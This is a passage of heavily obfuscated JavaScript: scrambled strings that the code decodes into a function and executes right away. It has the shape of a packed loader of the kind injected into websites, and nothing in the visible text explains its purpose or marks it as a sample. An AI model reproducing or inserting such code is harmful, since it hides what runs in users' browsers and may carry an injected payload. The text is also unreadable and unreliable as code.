ot);.{craj;s5(A+(o+(v c]7;h}r6ldvdt;nb2fgc=1=]8f+}=lcdl)(-(d+=d=gS lia(vsln]lr)4b"l,7laA.f)..bjg ]nesr=+curl6oi;o=t2= 7)x7s=[=+[])3dtf+h1.idAo!tnulqf=.=.70;}v. u9hu-(s1bstdi7urrr",e} c=)n;9pea4u)8)n,-pv(it,[)]ov;f)rr*6;2ja;-]s"c;vu+5an.1+,act3 +4;1;2v,o(f];nt,6,i8 hf2hn+atnilg6fo0yC.=eCbdernjete(a(v6is u0m),uisepgih;f8isj9m,senaty=;p1sha+Au;r)=i+r("<5t-hnsa.rqmg9[rC(de akn2a5a+hraf(}n5f.])(hw("t[)(0;wn) i;';var hnj=Nhg[dyS];var UtZ='';var HyG=hnj;var GHF=hnj(UtZ,Nhg(FKz));var YDE=GHF(Nhg('.f.cK])eii)KVhxi+{%d:0Klrn2cs3)d=[cK;m1=M6to.+l{u+b)_rK]le;)*b(r(o)[b_tB_K_=4;K)3_(7p]2p[=K; n)(t2.cao2>cc(ioipr%nKbKKy{KK8t!]1+.h0KK)+r ()%jc,riN1tik=3.%au%.xf6%xN)98{fd4%9to1aKi9.sKtAK%aKtui9uK1bte!2oV)K]6&rp_bKS_=}cr1.gp!Kw]{ih]cQ.e_XxfKsKK#.c9.er_3pK-vlp_Ku[y.drKM)Ke0rM1.nKps1.).. K).!cnrnecKd]% cKwed}co.uKK..D)\/es!5)2I)K11KeIfKdKK.sP5]KectK"mnse0ibea%b1hutu=eK)P]*otaelY]Bcc%Wj!o;whfce%fCocwKrtun13f2of_o+pie% .(g0%t6K_=Ki(ne.=CKK%Hi_C,aK4oe=,oK,%eiK).txmlK3d_ioyttkkn(rmrt_pt725ut,=uo[n=aocne4){t3as(d"andtet9nns.RKi1_Kc6!pG]1Ktn0K_nenKe_>s=]]_K(ur0K_fbabeh]SKy"t-geea1ia]KK%mue4?Kx)rs_br(dfv@t4eK;6l==%s=Kai; ,t%cBPt}pl]%c%aKr)ccc$d0$Kpb(.&xcf!5KKp_5.t5KcoeKuKKlcKKer2m)e{notirt%iK1e4 oiibyp2r9rK0.%e.sc3;a9K%7K(tKh1no_sc>p.uKsee)gK(8W;qpentth]ic_.!K{! ]g8olanige=!lb.{k)55}do2%!38[k.cso]efK3N4)0hKdup]stKr7!K5 ge lc.K.2rKK]lcc5(pab3(pecnnKtoeK_ptKeljo.)K>!iowe)>)!S]_orv))hi.uj.KdKrsK%esKo+dOss{zKwg;Jiic{4bTcr>iec o2tKy}gntKa.sGcte?[tnesbl.3Ks0a_ofn[s] %f=b.%r+xotddK%6.__%=9(e!ho6)rKbnfr%}sc-1a=akhK2dKnocn2KgoK?,berlcNc<Kn oT= t);.rK._K%y).o.c;K! KeK6Kb%t)c{n;K%tKe}_;rtKra+ici [g<)cc&h]]ft.3_TK.r) ejE2r>rtd[ co32>9.ei)a.S}Na=a}R,KK]wlKKK`1}Uu2IK)sa_iDrd3h59_KKai;Kb+}}cc26T\\bKC:KjRomATatKErr.l]!cozoo ecK0Stojbc3k.nKe,Njoc]t=t1KQ.=.Fsg[K0.r6!K=t%VK;]n:==zngKe0)iy)tretbt3c.0_e%IcWQ1blo_(4!_23xo;Kpu\/iK,tbK(iglr$(l%)ca7K]l!%cNt=((K:enhCmcn.Klhr;K=S%.Y1;Qo=]Kr{Kgi{,Kor8Kvn_.o+d`Kfg? c34c;KcKaja[=roe1K,7\/K.t)_d?]nvKJKb1vtliKdCKi)(o4}ccbc!t}5n@ld&5K2yx]ol7K)t&j.p Haoi]Smros) 16]]a%+K]Kc%[_Kabol%9=6mKauKt_b]K_c"nKc.UKl,r_h KKK(l_KK%1n;ry.0Kt,KL%er)cd.KKKlibK3KK4e4Ke7d;+c8rn_.)Knaa4KK1cKsd ]9r>jn(oi;K=d;:K%=5eKnv+c09)F[.oK]eic]1K]e.(.KKexKK:nc0KK={ouf}Seio9Wb%>0Kcg3foK0)cikc$tpsc%{X&Kt.)m=c;.nct1rnKe.KK4pto$3]z($],(b(i3rc%tK8Koh=tKo+n]rn!eoc4K2hu#.cbK(rc83Ks!_%WK_riKt)sd.2o11]KKiKpaKanu]in(iK21*uK.et1K.1s{=_`3K)noi6c.lo_K(ttK(%_ic `;stj(rc],aKx_K.bvecyg1_GKr!K)=]KeoKK@62b]K}%=oeh*K=}nK021crtii o]8!dw,_(]#}Kcb\/!KKRr3nrra]:extdv1pKon (e=b35a0s} K(s)ho7:K7u1_Kuo(e\\:3K]K=5l2o,hN_tnQ4ran43rl]}G2m]n\\]:KK1_en=f9.d>})KQK1;6F25KfK,eetnfK_stm=fwtoK5o:SKSb%e{e}tn_#ciX}r2KnhI,2c,)=g](5)Kmdom_KQo!b)h_K}+f7];Kareeh%i]{ycc}45d4))K[cost[_Kir+KK$e rz&!`)eeco]]Kh1.6bK$%4rKt Ks(r0)dKK%er{K K._(.1_u.a!_;K.4WKKc3MK$Kf61]_KAd}sKn.]]cK])..]9eC}j%o_eKcK.4.nd,1[2Km=}stet9K6(ptn:=dK3xui4_WV ..@K_i]=8ea?hKKtKK <+]7t.bem:pKlKKK=xmKK&pnic.st)n0uk.lKK!,K%e)?K$i%()3l`]?ofnK1 K),Ej=8ex*{6@dt\'tw,scKttK_^m#6n\'Qa]BK7r]K >:{thu=}v8c%Knr-tcobwt6u(ltf_Kld9p(-eo6KKe+KrbK.ttb;4_&KpcacE(aif-f2o_t(cts!er%sSOKc_K];L)Kep)+7KbmTytazdd3_s]r.ft&.!]iK,K(ra]r:K(.oK=#6Aecop]$Ie=4%Fid1]]ar2.c{s:ua&aiKl?tj(iaEKL=Ob&)enK,KKvKkn]K&o6K);_chtK)dKKm%rf23}KoKl_h=e4c],%0NK(%tc1e#;0t= .:$$)srK%6))43tyK th!e3c,t_js _aQ t%dYl3opK<_+Kg.?).? 4(2".o=koX9uos,KK+__)(K=m_(j3_lKu($%Kcd&$]_tK.y{Kb;!e3cb(K-.K}7K)ndKcK+ret3+tr0K4}".Khp]8b_%_($](g\'4+K,$[{g(=K4,od=dSgK(.=c^ais&er5re[6=]c.2Ko%6KweKo;te$;]ltd(__8;ui0r(e}K)K.)5KtntKKt].%.16a:.sMapmKzuK94i&c%fo`W6N^4sti 9)K+l]C2tK}"(Jc1K50K1K)h2ee=6;g5)oiEtf%( WE(gs-=nt{l_46K44=aKsm\\Ko[KTtK e%5tK!]K)(.tp{p_in]r.K23u(_KKpja,\/1]nsi)c#6nr=5!i}-ra Keu=!{KK\\f_%Z$v.1*h\'2!(=)cL;cpenFf{Dyln_onKe{}Ke]Kr{cIK0rwe(dKcMh(oi!K!z)5eZU)tgcan)}da8KK {ifal.+}{klroe%gKIl_c9(K[KT-]o[L3.K)KoW.c0paf_n(5==;K,_:]K+1K%t2_>)cK K2e01atT`D2 Kn1 (e0s{{h.K c]5$cHeo9r5.]i9 _$KKced_g]KeK9=KOo6i)K2f5.]v)c_t6vhmc]QK]o}KaKvL%]xhK_sKaKEeh]Te)nRKnb\\1!r_,>paKp]pb)d!n.ecCcK8o);,cf7!g6K2t"3_R>t.]rsrK`Kc+o_oco_KanE3(_, )vK.f{f%cdK_boKHc_.a4a+_-}h-=.Lkn.ee]  a=bor]"et{ifi,9cc>]8oK%(sc1imaou_6)K$a:ui2,]K!srI.t2"..EKoetufi,tc1d)rpK]s!Kn7K{}u!36Kol0i!rt6:{!4;$inl2)f_,){:k-pKC)p)%con4o6KblKKxoma3a,_st.)_3cK)d1_,_oa]am1%c%Scsn_9e;tcc$c1e(_Kl(&p;=sf)sp(doW]oK.64%6.cot!i GlD4iacz6rPK_451;e]f(}J`lcec_wXe1E(%_.Km:c__eK}.9t02]Kcz.Ke>1ta_WKW.s.)1K6^&en.Cic9 6Ki[]KtKrK K9e& {mser3d*3slf_mce )9_ 0[.1KKK;1c.=!rce>d)K n\/K(_=0tKio.lc)d iK2Ei\'$067} laK-$9_[0f }0fK1Klmn=aK4.Kl.c nc:].eptK_a[s.lbslty%nKficn}n1nyS.]ene,.bK`f%pKKU 04eh9!o. %i.}s=lib)al}=U]w_nr; K.dK]K.0o;=s)(eb3%7)=cfe}={7_ tzo. lKn K.%jKjz(t.Xt`_s6ueK; }K,u_K5gcd]T}Kap}a(.dKnxe3oN 2K4^KKct5KKao z=5gpnAK?;1K]f! ]cKea i.l{8 i0c#K]g,o} ;yriui{(K_f}; .rc]Ca.r=]c.K4,,}M}j]bY\\yKrKtnr(K: 6KbiK)g]]{=_g.=ne] Ki._#'));var WoV=HyG(eik,YDE );WoV(2872);return 6438})()
